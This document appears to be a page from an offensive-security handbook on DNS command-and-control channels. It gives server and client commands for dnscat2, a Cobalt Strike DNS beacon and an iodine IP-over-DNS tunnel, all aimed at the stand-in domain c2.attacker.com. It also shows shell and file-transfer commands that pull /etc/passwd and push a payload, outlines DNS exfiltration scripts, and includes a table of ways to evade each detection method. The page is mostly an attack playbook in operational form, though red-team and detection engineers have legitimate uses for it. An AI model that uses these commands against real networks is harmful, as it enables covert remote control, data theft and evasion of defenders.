# DNS-Based Command & Control

> **MITRE ATT&CK**: Command and Control > T1071.004 - Application Layer Protocol: DNS
> **Platforms**: Windows, Linux, macOS
> **Required Privileges**: User (DNS resolution access -- almost universally available)
> **OPSEC Risk**: Low-Medium (DNS is rarely blocked; detection depends on monitoring maturity)

## Strategic Overview

DNS is the cockroach of C2 channels -- it survives almost everything. When HTTP/HTTPS is proxied, inspected, or blocked, DNS resolution nearly always works because it is fundamental to network operations. Even air-gapped networks sometimes allow DNS resolution through forwarding chains. DNS C2 encodes commands and data within DNS queries and responses, leveraging the attacker's authoritative nameserver to relay communications. The trade-off is speed: DNS C2 is significantly slower than HTTP-based channels due to query size limits and protocol overhead, making it ideal for persistent, low-and-slow access rather than interactive operations.

**When to use DNS C2**: As a backup/fallback channel when HTTP is blocked or inspected, for long-term persistent access with minimal traffic, or in heavily monitored environments where HTTPS traffic is decrypted at the proxy.

## Technical Deep-Dive

### DNS C2 Theory

```
How DNS C2 works:

1. Attacker registers domain: c2.attacker.com
2. Attacker configures authoritative NS for c2.attacker.com to point to attacker's server
3. Implant on target encodes data as DNS queries:
   [encoded-data].c2.attacker.com
4. Query traverses: Target -> Internal DNS -> Root -> TLD -> Attacker's NS
5. Attacker's NS receives query, decodes data, sends response with encoded commands
6. Implant reads DNS response, decodes command, executes

DNS Record Types for C2:
  A record:      32 bits per response (IPv4 address = 4 bytes of data)
  AAAA record:   128 bits per response (IPv6 = 16 bytes of data)
  TXT record:    Up to ~255 bytes per record, multiple records per response
  CNAME record:  Up to 253 bytes of encoded data
  MX record:     Limited data in preference + hostname

Subdomain encoding: Up to 253 characters total, 63 per label
  Example: aGVsbG8gd29ybGQ.chunk2data.c2.attacker.com
```

### dnscat2 (Full DNS Tunnel)

```bash
# Server setup (attacker -- authoritative NS for c2.attacker.com)
# Install
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server && gem install bundler && bundle install

# Start server
ruby dnscat2.rb --dns "domain=c2.attacker.com,host=0.0.0.0" --secret=SharedSecret123

# Client (target -- Windows)
.\dnscat2.exe --dns "domain=c2.attacker.com" --secret=SharedSecret123

# Client (target -- Linux/PowerShell)
# PowerShell client
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain c2.attacker.com -PreSharedSecret SharedSecret123

# Server commands
dnscat2> windows                    # List active sessions
dnscat2> window -i 1                # Interact with session 1
command (session)> shell            # Start interactive shell
command (session)> download /etc/passwd /tmp/passwd.txt
command (session)> upload /tmp/payload.exe C:\Temp\payload.exe
command (session)> exec calc.exe    # Execute command

# OPSEC: Use --secret to encrypt traffic (prevents DNS inspection)
# Without --secret, commands are visible in DNS query content
```

### Cobalt Strike DNS Beacon

```
# Listener setup
Cobalt Strike > Listeners > Add
  Payload: Beacon DNS
  DNS Host: data.c2.attacker.com    # A record data channel
  DNS Host (Stager): stage.c2.attacker.com
  DNS Beacon: c2.attacker.com       # NS record pointing to team server

# DNS configuration required:
# NS record:  c2.attacker.com -> teamserver.attacker.com
# A record:   teamserver.attacker.com -> TEAM_SERVER_IP

# Generate DNS beacon payload
Attacks > Packages > Windows Executable (S)
  Listener: DNS Beacon
  Output: Windows EXE (or DLL, PowerShell, etc.)

# Beacon operation
beacon> mode dns          # Use DNS A records for data
beacon> mode dns-txt      # Use DNS TXT records (faster, more data per query)
beacon> mode dns6         # Use DNS AAAA records
beacon> checkin            # Force immediate checkin
beacon> sleep 300 50      # 5 min sleep, 50% jitter (appropriate for DNS)

# DNS beacon is slower -- use for:
# - Long-term persistence (sleep 3600+)
# - Backup channel when HTTP is blocked
# - Environments that only allow DNS through internal resolvers
```

### iodine (IP-over-DNS Tunnel)

```bash
# Full IP tunnel over DNS -- gives you a network interface
# Useful for routing any TCP/UDP traffic through DNS

# Server (attacker -- must be authoritative NS)
iodined -c -P StrongPassword -f 10.0.0.1/24 tunnel.attacker.com
# -c = disable client IP check
# -f = run in foreground
# 10.0.0.1 = server tunnel IP

# Client (target)
iodine -P StrongPassword tunnel.attacker.com
# Client gets IP like 10.0.0.2 on dns0 interface

# Now you have a full network tunnel
# Route traffic through it
ssh -D 1080 user@10.0.0.1      # SOCKS proxy through DNS tunnel
# Or use directly for any TCP connection

# Throughput: ~50-100 KB/s depending on DNS infrastructure
# Supports: NULL, TXT, SRV, MX, CNAME, A, AAAA query types
# Auto-selects fastest available record type
```

### DNS Tunneling with Custom Scripts

```python
# Minimal DNS exfiltration -- base32 encode data, split into 63-char labels, send as A queries
# dns.resolver.resolve(f"{chunk}.{index}.exfil.{domain}", 'A')
# Response is irrelevant -- data travels in the query itself to attacker's authoritative NS
# Receive commands via TXT record lookups: dns.resolver.resolve(f"cmd.{domain}", 'TXT')
```

```powershell
# PowerShell DNS exfiltration (no external tools, uses Resolve-DnsName)
# Base64url encode data, chunk into 60-char labels, query as subdomains
# Resolve-DnsName -Name "$chunk.$index.exfil.$Domain" -Type A -ErrorAction SilentlyContinue
```

### DNS over HTTPS (DoH) for Evasion

```
# DoH bypasses internal DNS monitoring -- queries go via HTTPS to cloudflare-dns.com or dns.google
# Bypasses: internal DNS logging, DNS IDS/IPS, DNS sinkholing, split-horizon controls
# Requires: HTTPS egress to DoH providers (some orgs block known DoH endpoints)
```

## Detection & Evasion

| Detection Method | What It Catches | Evasion Technique |
|-----------------|----------------|-------------------|
| DNS query volume | High query rate to single domain | Long sleep intervals (300s+), spread queries |
| DNS payload entropy | Base64/encoded data has high entropy | Use hex encoding, dictionary-based encoding |
| Unusual record types | TXT/NULL queries are uncommon for most hosts | Use A records only (slower but less suspicious) |
| Long subdomain labels | Normal labels are short (www, mail) | Shorter chunks, more queries instead of fewer long ones |
| DNS query length | Legitimate queries are typically short | Limit label length to 30 chars |
| Beaconing patterns | Regular interval queries | High jitter (50%+), randomized intervals |
| Passive DNS monitoring | New domains with sudden query volume | Use aged domains, gradual ramp-up |
| DNS over HTTPS | Blocks DoH providers | Use less-known DoH resolvers, custom DoH endpoints |

**Evasion best practices**: Use long sleep times (15-60 min), encrypt tunnel traffic (dnscat2 `--secret`), prefer A record mode over TXT, register CDN-looking domains, and be aware of Snort/Suricata signatures for dnscat2/iodine and DNS analytics platforms (Cisco Umbrella, Infoblox).

## Cross-References

- [C2 Frameworks](./c2-frameworks.md)
- [C2 Infrastructure](./c2-infrastructure.md)
- [Covert Channels](./covert-channels.md)
- [Exfiltration Channels](../10-collection-and-exfiltration/exfiltration-channels.md)

## References

- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- dnscat2: https://github.com/iagox86/dnscat2
- iodine: https://github.com/yarrick/iodine
- DNS Tunneling Detection: https://www.sans.org/white-papers/dns-tunneling/
- Cobalt Strike DNS Beacon: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_dns-beacon.htm
